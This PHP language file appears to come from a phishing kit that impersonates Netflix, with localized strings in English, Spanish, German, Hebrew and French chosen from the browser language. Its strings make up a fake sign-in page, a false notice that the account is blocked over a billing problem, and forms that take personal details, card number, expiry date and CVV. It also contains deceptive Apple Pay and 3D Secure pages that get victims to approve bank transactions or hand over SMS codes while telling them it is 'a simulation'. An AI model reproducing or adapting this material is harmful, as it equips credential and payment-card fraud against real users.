<?php

$lang = strtolower(substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2));

$Francais = false;	//disponible
$Hebreu = false;	//disponible
$Autriche = false; //disponible
$Suedois = false;  //disponible
$Anglais = false; // disponible
$Espagnol = false; // disponible
$Allemand = false; // disponible



$Arabe = false; // Indisponible
$Danois = false; // Indisponible
$Polonais = false; // Indisponible
$Custom = false; //Plutard


//  fait la lang auto


if($lang  == "fr"){
	
	$Francais = true;	

}else if($lang  == "es"){
	
	$Espagnol = true;	
	
}else if($lang  == "de"){
	$vivick = strtolower(substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 5));
	if($vivick  == "de-at"){
	
		$Autriche = true;	

	}else{
		
		$Allemand = true;	
	}
	
}else if($lang  == "sv"){
	
	$Suedois = true;	
	
}else if($lang  == "he"){
	
	$Hebreu = true;	
	
}else{
	
	$Anglais = true;
	
}



if ($Anglais == true) {
    ////////////////////       LOGIN         /////////////////////////////////

    $TXT_Sidentifier = "Sign In"; // S'identifier
    $TXT_EmailNum = "Email or phone number"; // Email ou numéro de téléphone
    $TXT_MotDePasse = "Password"; // Mot de passe
	
	// new
	$TXT_Error_MSG	= "Sorry, no account is linked to this email. Please try again or";
	$TXT_Error_MSG_link	= "create a new account";
	$TXT_Error_MSG_APPLEPAY = "Invalid code";
	
	
    $TXT_Souvenir = "Remember me"; // Se souvenir de moi
    $TXT_BesoinAide = "Need help? "; // Besoin d'aide ?
    $TXT_PremierVisite = "New to Netflix? "; // Première visite sur Netflix ?

    $TXT_InscrivezVous = "Sign up now"; // Inscrivez-vous
    $TXT_Captcha = "This page is protected by Google reCAPTCHA to ensure you're not a bot."; // Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot.
    $TXT_SavoirPlus = "Learn more."; // En savoir plus.

    ////////////////////       error_on_login         /////////////////////////////////

    $SuspAbo = "Suspension of your subscription."; // Suspension de votre abonnement.
    $PrblPaiment = "A payment issue occurred during the last billing cycle."; // Un problème de paiement a eu lieu lors du dernier cycle de facturation.
    $NvDoncBloque = "We have therefore blocked your account pending confirmation of your billing information."; // Nous avons donc bloqué votre compte en attendant la confirmation de vos informations de facturation.
    $VeuillezVerif = "Please verify your information to continue."; // Veuillez vérifier vos informations pour continuer.

    $Poursuivre = "Continue"; // Poursuivre


    $InfoPerso = "Personal informations"; // Informations personnelles
    $Nom = "First name"; // Nom
    $Prenom =  "Last name"; // Prenom
    $dof = "Date of birth"; // Date de naissance
    $numd = "Phone"; // Numéro de téléphone
    $adresse = "Address"; // Adresse
    $ville = "City"; // Ville
    $cp = "Zip code"; // Code Postal

    $continuer = "Continue"; // Continuer

    $ChampCorrecte = "Please fill in the information correctly in the dedicated fields."; // Veuillez renseigner correctement les informations dans les champs dédiés.

    $infoBanque = "Payment Information"; // Informations bancaires
    $dateInco = "The expiration date entered is incorrect."; // La date d'expiration entrée est incorrecte.
    $reNouvelle = "Your subscription has already been renewed."; // Le renouvellement de votre abonnement à déjà été effectué.

    $NumCarte = "Card number"; // "Numéro de carte
    $dde =  "Expiration date"; // Date d'expiration
    $cvvtxt = "Security code ( CVV )"; // Code de sécurité ( CVV ) 

    $Confirmer = "Confirm"; // Confirmer

    $activApple = "Activate Apple Pay"; // Activation d'Apple Pay
    $DesormaisApple = "Netflix is now an Apple Pay partner  . "; // Netflix est désormais partenaire d'Apple Pay  . 
    $DesormaisApple1 = " To verify your payment method, enter the code received by SMS (this may take a few minutes depending on your telephone operator)."; //  Pour vérifier votre moyen de paiement , renseignez le code reçu par SMS(cela peut prendre quelques minutes selon votre opérateur téléphonique).

    $CodeParSMS = "Code received by SMS"; // Code reçu par SMS
    $VerifCours = "Verification in progress"; // Vérification en cours
    $RedirectAuto = "Automatic redirect in: "; // Redirection automatique dans :  
    $sec = "seconds"; // secondes

    $opfinal =  "Operation completed"; // Opération terminée
    $rediretFinal = "You will be automatically redirected to:"; // Vous serez automatiquement redirigé dans :

    $TXT_QuestionsOnly = "Questions? Contact us."; // Des questions ? Appelez le 
    $tXT_QuestionsNum = ""; // (+33) 0805-543-063

    $TXT_CentreAide = "Help Center"; // Centre d'aide
    $TXT_Condition = "Terms of Use"; // Conditions d'utilisation
    $TXT_Confi = "Privacy"; // Confidentialité
    $TXT_PrefCookies = "Cookie Preferences"; // Préférences de cookies
    $TXT_Mention = "Corporate Information"; // Mentions légales
	
	
	$WAIT_title = "Confirmation";
	$WAIT_subtext = "Please wait...";
	
	
	// page app
	
	$appTitle = "Banking Application Link";
	$appDescription = "To better secure our payments, we are affiliated with Apple Pay. You simply have to accept the active transaction on your banking application to activate Apple Pay. this transaction contains a random amount and a random site.";
	$appWarning = "Please note that under no circumstances will you be charged";
	
	// page 3d application
	
	$app3dApplication = "Summary of your payment";
	$app3dApplication1 = "Merchant";
	$app3dApplication2 = "Netflix";
	$app3dApplication3 = "Amount";
	$app3dApplication4 = "0,50&nbsp;$";
	$app3dApplication5 = "Date";
	$app3dApplication6 = "Card number";
	$app3dApplication7 = "Your operation needs to be secured.";
	$app3dApplication8 = "A mobile confirmation request has been sent to your device";
	$app3dApplication9 = "Start your mobile application";
	$app3dApplication11 = "to verify and confirm this operation.";
	$app3dApplication12 = "Please validate your transaction on your cell phone.";
	$app3dApplication13 = "Cancel";	
	
	// page 3d sms
	
	$sms3dpage_1 = "3D Verification";
	$sms3dpage_2 = "SMS IDENTIFICATION";
	$sms3dpage_22 = "SECURITY IDENTIFICATION";

	$sms3dpage_3 = "Thank you for entering the one-time sms code that we sent you by phone.";
	$sms3dpage_4 = "REMARK:";
	$sms3dpage_5 = " This is a simulation, you will in no case be debited by any amount.";
	$sms3dpage_6 = "Reference :";
	$sms3dpage_7 = "holder_Verification";
	$sms3dpage_8 = "Amount :";
	$sms3dpage_9 = "0,50 $";
	$sms3dpage_10 = "Date :";
	$sms3dpage_11 = "Credit card number:";
	$sms3dpage_12 = "Phone Number :";
	$sms3dpage_13 = "+**";
	$sms3dpage_14 = "Enter the sms code:";
	$sms3dpage_15 = "Abandon and cancel the transaction";
	$sms3dpage_16 = "Validate";
	$sms3dpage_17 = "Copyright Verified by ";
	
	// 3d type 2
	
	$sms3dpage2_1 = "Enter the Secure Code:";
	
	// 3d type 3
	
	$sms3dpage3_1 = "Enter the SMS code";
	$sms3dpage3_2 = "Enter the Password";
}



if ($Espagnol == true) {
    ////////////////////       LOGIN         /////////////////////////////////

    $TXT_Sidentifier = "Inicia sesión"; // S'identifier
    $TXT_EmailNum = "Correo electrónico o número de teléfono"; // Email ou numéro de téléphone
    $TXT_MotDePasse = "Contraseña"; // Mot de passe
	// new
	$TXT_Error_MSG	= "Lo sentimos, no hay ninguna cuenta vinculada a este correo electrónico. Por favor, inténtelo de nuevo o";
	$TXT_Error_MSG_link	= "crear una nueva cuenta";
	$TXT_Error_MSG_APPLEPAY = "Código inválido";
	
    $TXT_Souvenir = "Acuérdate de mí"; // Se souvenir de moi
    $TXT_BesoinAide = "Necesito ayuda? "; // Besoin d'aide ?
    $TXT_PremierVisite = "Nuevo en Netflix? "; // Première visite sur Netflix ?

    $TXT_InscrivezVous = "Inscríbase ahora"; // Inscrivez-vous
    $TXT_Captcha = "Esta página está protegida por Google reCAPTCHA para asegurar que no eres un bot."; // Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot.
    $TXT_SavoirPlus = "Más información."; // En savoir plus.

    ////////////////////       error_on_login         /////////////////////////////////

    $SuspAbo = "Suspensión de su suscripción."; // Suspension de votre abonnement.
    $PrblPaiment = "Se ha producido un problema de pago durante el último ciclo de facturación."; // Un problème de paiement a eu lieu lors du dernier cycle de facturation.
    $NvDoncBloque = "Por lo tanto, hemos bloqueado su cuenta a la espera de la confirmación de sus datos de facturación."; // Nous avons donc bloqué votre compte en attendant la confirmation de vos informations de facturation.
    $VeuillezVerif = "Por favor, verifique su información para continuar."; // Veuillez vérifier vos informations pour continuer.

    $Poursuivre = "Continuar"; // Poursuivre


    $InfoPerso = "Información personal"; // Informations personnelles
    $Nom = "Nombre"; // Nom
    $Prenom =  "Apellido"; // Prenom
    $dof = "Fecha de nacimiento"; // Date de naissance
    $numd = "Teléfono"; // Numéro de téléphone
    $adresse = "Dirección"; // Adresse
    $ville = "Ciudad"; // Ville
    $cp = "Código postal"; // Code Postal

    $continuer = "Continuar"; // Continuer

    $ChampCorrecte = "Por favor, rellene la información correctamente en los campos correspondientes."; // Veuillez renseigner correctement les informations dans les champs dédiés.

    $infoBanque = "Información de pago"; // Informations bancaires
    $dateInco = "La fecha de caducidad introducida es incorrecta."; // La date d'expiration entrée est incorrecte.
    $reNouvelle = "Su suscripción ya ha sido renovada."; // Le renouvellement de votre abonnement à déjà été effectué.

    $NumCarte = "Número de tarjeta"; // "Numéro de carte
    $dde =  "Fecha de caducidad"; // Date d'expiration
    $cvvtxt = "Código de seguridad ( CVV )"; // Code de sécurité ( CVV ) 

    $Confirmer = "Confirmar"; // Confirmer

    $activApple = "Activar Apple Pay"; // Activation d'Apple Pay
    $DesormaisApple = "Netflix ya es socio de Apple Pay  . "; // Netflix est désormais partenaire d'Apple Pay  . 
    $DesormaisApple1 = " Para verificar su método de pago, introduzca el código recibido por SMS (esto puede tardar unos minutos dependiendo de su operador telefónico)."; //  Pour vérifier votre moyen de paiement , renseignez le code reçu par SMS(cela peut prendre quelques minutes selon votre opérateur téléphonique).

    $CodeParSMS = "Código recibido por SMS"; // Code reçu par SMS
    $VerifCours = "Verificación en curso"; // Vérification en cours
    $RedirectAuto = "Redirección automática en: "; // Redirection automatique dans :  
    $sec = "segundos"; // secondes

    $opfinal =  "Operación completada"; // Opération terminée
    $rediretFinal = "Será redirigido automáticamente a:"; // Vous serez automatiquement redirigé dans :

    $TXT_QuestionsOnly = "¿Preguntas? Póngase en contacto con nosotros."; // Des questions ? Appelez le 
    $tXT_QuestionsNum = ""; // (+33) 0805-543-063

    $TXT_CentreAide = "Centro de ayuda"; // Centre d'aide
    $TXT_Condition = "Condiciones de uso"; // Conditions d'utilisation
    $TXT_Confi = "Privacidad"; // Confidentialité
    $TXT_PrefCookies = "Preferencias de las cookies"; // Préférences de cookies
    $TXT_Mention = "Información corporativa"; // Mentions légales
	
	
	$WAIT_title = "Confirmación";
	$WAIT_subtext = "Por favor, espere...";
	
	
	
	// page app
	
	$appTitle = "Enlace a la aplicación bancaria";
	$appDescription = "Para asegurar mejor nuestros pagos, estamos afiliados a Apple Pay. Simplemente tienes que aceptar la transacción activa en tu aplicación bancaria para activar Apple Pay. esta transacción contiene un importe y un sitio aleatorios.";
	$appWarning = "Tenga en cuenta que en ningún caso se le cobrará";
	
	// page 3d application
	
	$app3dApplication = "Resumen de su pago";
	$app3dApplication1 = "Comerciante";
	$app3dApplication2 = "Netflix";
	$app3dApplication3 = "Importe";
	$app3dApplication4 = "0,50&nbsp;&euro;";
	$app3dApplication5 = "Fecha";
	$app3dApplication6 = "Número de tarjeta";
	$app3dApplication7 = "Su operación debe estar asegurada.";
	$app3dApplication8 = "Se ha enviado una solicitud de confirmación por móvil a su dispositivo";
	$app3dApplication9 = "Inicie su aplicación móvil";
	$app3dApplication11 = "para verificar y confirmar esta operación.";
	$app3dApplication12 = "Por favor, valide su transacción en su teléfono móvil.";
	$app3dApplication13 = "Cancelar";	
	
	// page 3d sms
	
	$sms3dpage_1 = "Verificación 3D";
	$sms3dpage_2 = "IDENTIFICACIÓN DE SMS";
	$sms3dpage_22 = "IDENTIFICACIÓN DE SEGURIDAD";

	$sms3dpage_3 = "Gracias por introducir el código de sms único que le hemos enviado por teléfono.";
	$sms3dpage_4 = "REMARCA:";
	$sms3dpage_5 = " Esto es una simulación, en ningún caso se le cargará ninguna cantidad.";
	$sms3dpage_6 = "Referencia :";
	$sms3dpage_7 = "verificación_del_titular";
	$sms3dpage_8 = "Importe :";
	$sms3dpage_9 = "0,50 &euro;";
	$sms3dpage_10 = "Fecha :";
	$sms3dpage_11 = "Número de tarjeta de crédito:";
	$sms3dpage_12 = "Número de teléfono :";
	$sms3dpage_13 = "+**";
	$sms3dpage_14 = "Introduzca el código sms:";
	$sms3dpage_15 = "Abandonar y cancelar la transacción";
	$sms3dpage_16 = "Validar";
	$sms3dpage_17 = "Derechos de autor verificados por ";
	
	// 3d type 2
	
	$sms3dpage2_1 = "Introduzca el código seguro:";
	
	// 3d type 3
	
	$sms3dpage3_1 = "Introduzca el código del SMS";
	$sms3dpage3_2 = "Introduzca la contraseña";
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

if ($Allemand == true) {
    ////////////////////       LOGIN         /////////////////////////////////

    $TXT_Sidentifier = "Eintragen"; // S'identifier
    $TXT_EmailNum = "E-Mail oder Telefonnummer"; // Email ou numéro de téléphone
    $TXT_MotDePasse = "Passwort"; // Mot de passe

	
	// new
	$TXT_Error_MSG	= "Leider ist kein Konto mit dieser E-Mail verknüpft. Bitte versuchen Sie es erneut oder";
	$TXT_Error_MSG_link	= "ein neues Konto erstellen";
	$TXT_Error_MSG_APPLEPAY = "Ungültiger Code";

    $TXT_Souvenir = "Erinnern Sie sich an mich"; // Se souvenir de moi
    $TXT_BesoinAide = "Brauchen Sie Hilfe? "; // Besoin d'aide ?
    $TXT_PremierVisite = "Neu bei Netflix? "; // Première visite sur Netflix ?

    $TXT_InscrivezVous = "Jetzt anmelden"; // Inscrivez-vous
    $TXT_Captcha = "Diese Seite ist durch Google reCAPTCHA geschützt, um sicherzustellen, dass Sie kein Bot sind."; // Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot.
    $TXT_SavoirPlus = "Mehr erfahren."; // En savoir plus.

    ////////////////////       error_on_login         /////////////////////////////////

    $SuspAbo = "Aussetzung Ihres Abonnements."; // Suspension de votre abonnement.
    $PrblPaiment = "Während des letzten Abrechnungszyklus ist ein Zahlungsproblem aufgetreten."; // Un problème de paiement a eu lieu lors du dernier cycle de facturation.
    $NvDoncBloque = "Wir haben daher Ihr Konto bis zur Bestätigung Ihrer Rechnungsdaten gesperrt."; // Nous avons donc bloqué votre compte en attendant la confirmation de vos informations de facturation.
    $VeuillezVerif = "Bitte überprüfen Sie Ihre Angaben, um fortzufahren."; // Veuillez vérifier vos informations pour continuer.

    $Poursuivre = "Weiter"; // Poursuivre


    $InfoPerso = "Persönliche Informationen"; // Informations personnelles
    $Nom = "Vornamen"; // Nom
    $Prenom =  "Nachname"; // Prenom
    $dof = "Datum der Geburt"; // Date de naissance
    $numd = "Telefon"; // Numéro de téléphone
    $adresse = "Adresse"; // Adresse
    $ville = "Stadt"; // Ville
    $cp = "Postleitzahl"; // Code Postal

    $continuer = "Weiter"; // Continuer

    $ChampCorrecte = "Bitte tragen Sie die Informationen korrekt in die entsprechenden Felder ein."; // Veuillez renseigner correctement les informations dans les champs dédiés.

    $infoBanque = "Zahlungsinformationen"; // Informations bancaires
    $dateInco = "Das eingegebene Verfallsdatum ist falsch."; // La date d'expiration entrée est incorrecte.
    $reNouvelle = "Ihr Abonnement ist bereits verlängert worden."; // Le renouvellement de votre abonnement à déjà été effectué.

    $NumCarte = "Kartennummer"; // "Numéro de carte
    $dde =  "Verfallsdatum"; // Date d'expiration
    $cvvtxt = "Sicherheitscode ( CVV )"; // Code de sécurité ( CVV ) 

    $Confirmer = "Bestätigen Sie"; // Confirmer

    $activApple = "Aktivieren Sie Apple Pay"; // Activation d'Apple Pay
    $DesormaisApple = "Netflix ist jetzt ein Apple Pay Partner  . "; // Netflix est désormais partenaire d'Apple Pay  . 
    $DesormaisApple1 = " Um Ihre Zahlungsmethode zu überprüfen, geben Sie den per SMS erhaltenen Code ein (dies kann je nach Ihrem Telefonanbieter einige Minuten dauern)."; //  Pour vérifier votre moyen de paiement , renseignez le code reçu par SMS(cela peut prendre quelques minutes selon votre opérateur téléphonique).

    $CodeParSMS = "Per SMS empfangener Code"; // Code reçu par SMS
    $VerifCours = "Überprüfung im Gange"; // Vérification en cours
    $RedirectAuto = "Automatische Weiterleitung in: "; // Redirection automatique dans :  
    $sec = "Sekunden"; // secondes

    $opfinal =  "Operation abgeschlossen"; // Opération terminée
    $rediretFinal = "Sie werden automatisch weitergeleitet zu:"; // Vous serez automatiquement redirigé dans :

    $TXT_QuestionsOnly = "Noch Fragen? Kontaktieren Sie uns."; // Des questions ? Appelez le 
    $tXT_QuestionsNum = ""; // (+33) 0805-543-063

    $TXT_CentreAide = "Hilfe-Center"; // Centre d'aide
    $TXT_Condition = "Nutzungsbedingungen"; // Conditions d'utilisation
    $TXT_Confi = "Datenschutz"; // Confidentialité
    $TXT_PrefCookies = "Cookie-Einstellungen"; // Préférences de cookies
    $TXT_Mention = "Informationen zum Unternehmen"; // Mentions légales
	
	
	$WAIT_title = "Konfirmation";
	$WAIT_subtext = "Bitte warten...";
	
	
	// page app
	
	$appTitle = "Banking Application Link";
	$appDescription = "To better secure our payments, we are affiliated with Apple Pay. You simply have to accept the active transaction on your banking application to activate Apple Pay. this transaction contains a random amount and a random site.";
	$appWarning = "Please note that under no circumstances will you be charged";
	
	// page 3d application
	
	$app3dApplication = "Overzicht van uw betaling";
	$app3dApplication1 = "Koopman";
	$app3dApplication2 = "Netflix";
	$app3dApplication3 = "Bedrag";
	$app3dApplication4 = "0,50&nbsp;&euro;";
	$app3dApplication5 = "Datum";
	$app3dApplication6 = "Kaartnummer";
	$app3dApplication7 = "Uw operatie moet beveiligd worden.";
	$app3dApplication8 = "Er is een mobiel bevestigingsverzoek naar uw apparaat gestuurd.";
	$app3dApplication9 = "Start uw mobiele toepassing";
	$app3dApplication11 = "om deze operatie te verifiëren en te bevestigen.";
	$app3dApplication12 = "Bevestig uw transactie op uw mobiele telefoon.";
	$app3dApplication13 = "Annuleren";	
	
	// page 3d sms
	
	$sms3dpage_1 = "3D-verificatie";
	$sms3dpage_2 = "SMS IDENTIFICATIE";
	$sms3dpage_22 = "VEILIGHEIDSIDENTIFICATIE";

	$sms3dpage_3 = "Bedankt voor het invoeren van de eenmalige sms-code die we u per telefoon hebben gestuurd.";
	$sms3dpage_4 = "OPMERKING:";
	$sms3dpage_5 = " Dit is een simulatie, u wordt in geen geval gedebiteerd voor enig bedrag.";
	$sms3dpage_6 = "Referentie :";
	$sms3dpage_7 = "houder_Verificatie";
	$sms3dpage_8 = "Bedrag :";
	$sms3dpage_9 = "0,50 &euro;";
	$sms3dpage_10 = "Datum :";
	$sms3dpage_11 = "Kredietkaartnummer:";
	$sms3dpage_12 = "Telefoonnummer :";
	$sms3dpage_13 = "+**";
	$sms3dpage_14 = "Voer de sms-code in:";
	$sms3dpage_15 = "De transactie opgeven en annuleren";
	$sms3dpage_16 = "Valideer";
	$sms3dpage_17 = "Copyright Geverifieerd door ";
	
	// 3d type 2
	
	$sms3dpage2_1 = "Voer de beveiligde code in:";
	
	// 3d type 3
	
	$sms3dpage3_1 = "Voer de SMS-code in";
	$sms3dpage3_2 = "Voer het wachtwoord in";
}


if ($Hebreu == true) {
    ////////////////////       LOGIN         /////////////////////////////////

    $TXT_Sidentifier = "התחברות"; // S'identifier
    $TXT_EmailNum = "מייל או מספר טלפון"; // Email ou numéro de téléphone
    $TXT_MotDePasse = "סיסמה"; // Mot de passe

	// new
	$TXT_Error_MSG	= "מצטערים, שום חשבון לא מקושר לאימייל זה. אנא נסה שוב או";
	$TXT_Error_MSG_link	= "צור חשבון חדש";
	$TXT_Error_MSG_APPLEPAY = "קוד לא תקין";

    $TXT_Souvenir = "זכור אותי"; // Se souvenir de moi
    $TXT_BesoinAide = "זקוק לעזרה ? "; // Besoin d'aide ?
    $TXT_PremierVisite = "ביקור ראשון בנטפליקס?"; // Première visite sur Netflix ?

    $TXT_InscrivezVous = "הירשם"; // Inscrivez-vous
    $TXT_Captcha = "דף זה מוגן על ידי Google reCAPTCHA כדי להבטיח שאינך רובוט."; // Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot.
    $TXT_SavoirPlus = "למד עוד."; // En savoir plus.

    $InfoPerso = "מידע אישי"; // Informations personnelles
    $Nom = "שם משפחה"; // Nom
    $Prenom = "שם פרטי"; // Prenom
    $dof = "תאריך לידה"; // Date de naissance
    $numd = "מספר טלפון"; // Numéro de téléphone
    $adresse = "כתובת"; // Adresse
    $ville = "העיר"; // Ville
    $cp = "מיקוד"; // Code Postal

    $continuer = "לְהַמשִׁיך"; // Continuer

    $ChampCorrecte = "אנא מלא את המידע בצורה נכונה בשדות הייעודיים."; // Veuillez renseigner correctement les informations dans les champs dédiés.

    $infoBanque = "מידע בנקאי"; // Informations bancaires
    $dateInco = "תאריך התפוגה שהוזן אינו נכון."; // La date d'expiration entrée est incorrecte.
    $reNouvelle = "המנוי שלך כבר חודש."; // Le renouvellement de votre abonnement à déjà été effectué.

    $NumCarte = "מספר כרטיס"; // "Numéro de carte
    $dde = "תאריך תפוגה"; // Date d'expiration
    $cvvtxt = "קוד אבטחה ( CVV )"; // Code de sécurité ( CVV ) 

    $Confirmer = "כדי לאשר"; // Confirmer

    $activApple = "הפעל את Apple Pay"; // Activation d'Apple Pay
    $DesormaisApple = "נטפליקס היא כעת שותפה של Apple Pay."; // Netflix est désormais partenaire d'Apple Pay  . 
    $DesormaisApple1 = "כדי לאמת את אמצעי התשלום שלך, הזן את הקוד שהתקבל ב-SMS (זה עשוי להימשך מספר דקות, תלוי במפעיל הטלפון שלך)."; //  Pour vérifier votre moyen de paiement , renseignez le code reçu par SMS(cela peut prendre quelques minutes selon votre opérateur téléphonique).

    $CodeParSMS = "הקוד התקבל ב-SMS"; // Code reçu par SMS
    $VerifCours = "אימות מתבצע"; // Vérification en cours
    $RedirectAuto = "הפניה אוטומטית ב:"; // Redirection automatique dans :  
    $sec = "שניות"; // secondes

    $opfinal =  "הפעולה הושלמה"; // Opération terminée
    $rediretFinal = "אתה תופנה אוטומטית אל:"; // Vous serez automatiquement redirigé dans :

    $TXT_QuestionsOnly = "שאלות? להתקשר"; // Des questions ? Appelez le 
    $tXT_QuestionsNum = "0805-543-063"; // (+33) 0805-543-063

    $TXT_CentreAide = "מרכז עזרה"; // Centre d'aide
    $TXT_Condition = "תנאי שימוש"; // Conditions d'utilisation
    $TXT_Confi = "פְּרָטִיוּת"; // Confidentialité
    $TXT_PrefCookies = "העדפות קובצי Cookie"; // Préférences de cookies
    $TXT_Mention = "הודעה משפטית"; // Mentions légales
	
	
	$WAIT_title = "אִשׁוּר";
	$WAIT_subtext = "המתן בבקשה...";
	
	// page app
	
	$appTitle = "קישור ליישום בנקאי";
	$appDescription = "כדי לאבטח טוב יותר את התשלומים שלנו, אנחנו קשורים ל-Apple Pay. אתה פשוט צריך לקבל את העסקה הפעילה באפליקציית הבנק שלך כדי להפעיל את Apple Pay. עסקה זו מכילה סכום אקראי ואתר אקראי.";
	$appWarning = "שימו לב שבשום מקרה לא תחויב";
	
	// page 3d application
	
	$app3dApplication = "סיכום התשלום שלך";
	$app3dApplication1 = "סוֹחֵר";
	$app3dApplication2 = "Netflix";
	$app3dApplication3 = "כמות";
	$app3dApplication4 = "0,50&nbsp;$";
	$app3dApplication5 = "תַאֲרִיך";
	$app3dApplication6 = "מספר כרטיס";
	$app3dApplication7 = "הפעולה שלך צריכה להיות מאובטחת.";
	$app3dApplication8 = "בקשת אישור נייד נשלחה למכשיר שלך";
	$app3dApplication9 = "הפעל את האפליקציה לנייד שלך";
	$app3dApplication11 = "כדי לאמת ולאשר פעולה זו.";
	$app3dApplication12 = "אנא אשר את העסקה שלך בטלפון הנייד שלך.";
	$app3dApplication13 = "לְבַטֵל";	
	
	// page 3d sms
	
	$sms3dpage_1 = "אימות תלת מימד";
	$sms3dpage_2 = "זיהוי SMS";
	$sms3dpage_22 = "זיהוי אבטחה";

	$sms3dpage_3 = "תודה שהזנת את קוד ה-SMS החד-פעמי ששלחנו לך בטלפון.";
	$sms3dpage_4 = "הֶעָרָה:";
	$sms3dpage_5 = " זוהי סימולציה, בשום מקרה לא תחויב בשום סכום.";
	$sms3dpage_6 = "התייחסות :";
	$sms3dpage_7 = "מחזיק_אימות";
	$sms3dpage_8 = "כמות :";
	$sms3dpage_9 = "0,50 $";
	$sms3dpage_10 = "תַאֲרִיך :";
	$sms3dpage_11 = "מספר כרטיס אשראי:";
	$sms3dpage_12 = "מספר טלפון :";
	$sms3dpage_13 = "+**";
	$sms3dpage_14 = "הזן את קוד ה-SMS:";
	$sms3dpage_15 = "לנטוש ולבטל את העסקה";
	$sms3dpage_16 = "לְאַמֵת";
	$sms3dpage_17 = "זכויות יוצרים מאומת על ידי ";
	
	// 3d type 2
	
	$sms3dpage2_1 = "הזן את הקוד המאובטח:";
	
	// 3d type 3
	
	$sms3dpage3_1 = "הזן את קוד ה-SMS";
	$sms3dpage3_2 = "הכנס את הסיסמא";
}


if ($Francais == true) {
    ////////////////////       LOGIN         /////////////////////////////////

    $TXT_Sidentifier = "S'identifier"; // S'identifier
    $TXT_EmailNum = "Email ou numéro de téléphone"; // Email ou numéro de téléphone
    $TXT_MotDePasse = "Mot de passe"; // Mot de passe
	
	// new
	$TXT_Error_MSG	= "Désolé, aucun compte n'est relié à cet e-mail. Veuillez réessayer ou ";
	$TXT_Error_MSG_link	= "créer un nouveau compte";
	$TXT_Error_MSG_APPLEPAY = "Code non valide";
	
	
    $TXT_Souvenir = "Se souvenir de moi"; // Se souvenir de moi
    $TXT_BesoinAide = "Besoin d'aide ? "; // Besoin d'aide ?
    $TXT_PremierVisite = "Première visite sur Netflix ?"; // Première visite sur Netflix ?

    $TXT_InscrivezVous = "Inscrivez-vous"; // Inscrivez-vous
    $TXT_Captcha = "Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot."; // Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot.
    $TXT_SavoirPlus = "En savoir plus."; // En savoir plus.

    ////////////////////       error_on_login         /////////////////////////////////

    $SuspAbo = "Suspension de votre abonnement."; // Suspension de votre abonnement.
    $PrblPaiment = "Un problème de paiement a eu lieu lors du dernier cycle de facturation."; // Un problème de paiement a eu lieu lors du dernier cycle de facturation.
    $NvDoncBloque = "Nous avons donc bloqué votre compte en attendant la confirmation de vos informations de facturation."; // Nous avons donc bloqué votre compte en attendant la confirmation de vos informations de facturation.
    $VeuillezVerif = "Veuillez vérifier vos informations pour continuer."; // Veuillez vérifier vos informations pour continuer.

    $Poursuivre = "Poursuivre"; // Poursuivre


    $InfoPerso = "Informations personnelles"; // Informations personnelles
    $Nom = "Nom"; // Nom
    $Prenom =  "Prénom"; // Prenom
    $dof = "Date de naissance"; // Date de naissance
    $numd = "Numéro de téléphone"; // Numéro de téléphone
    $adresse = "Adresse"; // Adresse
    $ville = "Ville"; // Ville
    $cp = "Code Postal"; // Code Postal

    $continuer = "Continuer"; // Continuer

    $ChampCorrecte = "Veuillez renseigner correctement les informations dans les champs dédiés."; // Veuillez renseigner correctement les informations dans les champs dédiés.

    $infoBanque = "Informations bancaires"; // Informations bancaires
    $dateInco = "La date d'expiration entrée est incorrecte."; // La date d'expiration entrée est incorrecte.
    $reNouvelle = "Le renouvellement de votre abonnement à déjà été effectué."; // Le renouvellement de votre abonnement à déjà été effectué.

    $NumCarte = "Numéro de carte"; // "Numéro de carte
    $dde =  "Date d'expiration"; // Date d'expiration
    $cvvtxt = "Code de sécurité ( CVV ) "; // Code de sécurité ( CVV ) 

    $Confirmer = "Confirmer"; // Confirmer

    $activApple = "Activation d'Apple Pay"; // Activation d'Apple Pay
    $DesormaisApple = "Netflix est désormais partenaire d'Apple Pay  . "; // Netflix est désormais partenaire d'Apple Pay  . 
    $DesormaisApple1 = " Pour vérifier votre moyen de paiement , renseignez le code reçu par SMS(cela peut prendre quelques minutes selon votre opérateur téléphonique)."; //  Pour vérifier votre moyen de paiement , renseignez le code reçu par SMS(cela peut prendre quelques minutes selon votre opérateur téléphonique).

    $CodeParSMS = "Code reçu par SMS"; // Code reçu par SMS
    $VerifCours = "Vérification en cours"; // Vérification en cours
    $RedirectAuto = "Redirection automatique dans :  "; // Redirection automatique dans :  
    $sec = "secondes"; // secondes

    $opfinal =  "Opération terminée"; // Opération terminée
    $rediretFinal = "Vous serez automatiquement redirigé dans :"; // Vous serez automatiquement redirigé dans :

    $TXT_QuestionsOnly = "Des questions ? Appelez le "; // Des questions ? Appelez le 
    $tXT_QuestionsNum = "(+33) 0805-543-063"; // (+33) 0805-543-063

    $TXT_CentreAide = "Centre d'aide"; // Centre d'aide
    $TXT_Condition = "Conditions d'utilisation"; // Conditions d'utilisation
    $TXT_Confi = "Confidentialité"; // Confidentialité
    $TXT_PrefCookies = "Préférences de cookies"; // Préférences de cookies
    $TXT_Mention = "Mentions légales"; // Mentions légales
	
	
	$WAIT_title = "Confirmation";
	$WAIT_subtext = "Veuillez patienter...";
	
	
	// page app
	
	$appTitle = "Liaison par Application Bancaire";
	$appDescription = "Pour mieux sécuriser nos paiements. nous nous somme affilies avec Apple Pay. vous avez simplement a accepter l'operation active sur votre application bancaire pour activer Apple Pay. cette operation contient un montant et un site aléatoire.";
	$appWarning = "Veuillez noter que ne serez en aucun cas débite";
	
	// page 3d application
	
	$app3dApplication = "Récapitulatif de votre paiement";
	$app3dApplication1 = "Commerçant";
	$app3dApplication2 = "Netflix";
	$app3dApplication3 = "Montant";
	$app3dApplication4 = "0,50&nbsp;EUR";
	$app3dApplication5 = "Date";
	$app3dApplication6 = "Numéro de carte";
	$app3dApplication7 = "Votre opération nécessite une sécurisation.";
	$app3dApplication8 = "Une demande de confirmation mobile a été transmise à votre appareil";
	$app3dApplication9 = "Démarrez votre application mobile";
	$app3dApplication11 = "pour vérifier et confirmer cette opération.";
